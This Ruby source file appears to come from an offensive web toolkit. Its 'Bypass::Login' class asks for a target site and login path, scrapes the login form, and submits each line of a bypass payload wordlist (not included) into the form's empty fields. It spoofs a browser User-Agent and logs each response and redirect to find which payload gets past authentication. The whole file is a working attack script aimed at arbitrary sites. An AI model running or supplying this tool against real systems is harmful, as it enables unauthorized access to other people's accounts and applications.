module Bypass

	$regex1 = /<input([a-zA-Z0-9\=\s\"\-\.\'\_\+\;\:\%\[\]\,\(\)\/]+)/
	$regex2 = /(name\=\"|name\=\')([a-zA-Z0-9\-\_\[\]]+)/
	$regex3 = /(value\=\"|value\=\')([a-zA-Z0-9\-\_\&\%\/\#\[\]]+)/
	$regex4	= /action\=(\"|\')([a-zA-Z0-9\:\/\.\-\_]+)/

	class Login

		def initialize()
			print "- Input your target : "
				target = gets.chomp
			print "- Input path login page : "
				path = gets.chomp
			if target != nil && /https|http/.match(target) != nil
				begin
					_main_(target,path)
				rescue Exception => e
					puts "- " + e.message.yellow
				end
			end
		end

		def _main_(target,path)

			readpayload = File.readlines(read_payload_file())

			for x in 0..readpayload.size.to_i - 1

				uri 				= URI(target + path)
				http 				= Net::HTTP.new(uri.host, uri.port)
				http.verify_mode 	= OpenSSL::SSL::VERIFY_PEER
				if uri.scheme 		== "https"
					http.use_ssl 	= true
				end
				response = http.get(uri.request_uri)
				cookies  = response['Set-Cookie']

				# Split Form
				split1 	= response.body.split('<form')
				split2	= split1[1].split('</form>')

				# Split Action / POST URL
				action 	= split2[0].scan($regex4).flatten { |x| return true }

				if /https|http/.match(action[1])
					act = action[1]
				elsif action[1] == nil
					act = target
				else
					act = "#{target}/#{action[1]}"
				end

				getForm = split2[0].scan($regex1).flatten { |x| return true }

				# Delete bypass_tmp.txt file
				LOG.new.delete("logs/bypass_tmp.txt");

				for i in 0..getForm.length - 1

					getName = getForm[i].scan($regex2).flatten { |x| return true }

					if $regex3.match(getForm[i])
						v = getForm[i].scan($regex3).flatten { |x| return true }
						getVal = v[1]
					else
						getVal = readpayload[x]
					end

					if i >= getForm.length - 1
						val = "#{getName[1]}=#{getVal}"
					else
						val = "#{getName[1]}=#{getVal}&"
					end
					create_temp("logs/bypass_tmp.txt","#{val}".gsub("\n",''))
				end

				headers = {
					'Cookie' 		=> "#{cookies}",
					'User-Agent' 	=> "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0",
				}
				data 	= File.readlines('logs/bypass_tmp.txt')
				r 		= http.post(uri.request_uri, data[0], headers)

				if r['location']
					res = r['location']
				else
					res = '/'
				end
				flogs = "logs/bypass_render/#{x}.html"
				LOG.new.delete(flogs)
				LOG.new.create(flogs, r.body)
				# system("firefox #{flogs}")
				puts "- [PAYLOAD] => " + readpayload[x].gsub("\n",'') + " | [REDIR] => #{res}".yellow  + " | [POST] => #{act} ".white
			end # End Of Looping readpayload

		end # End Of Method

		def create_temp(filepath,text)
			open(filepath, 'a') { |f|
				f << "#{text}"
			}
		end

		def read_payload_file()
			return 'wordlists/bypass.txt'
		end

	end # End Class

end # End Module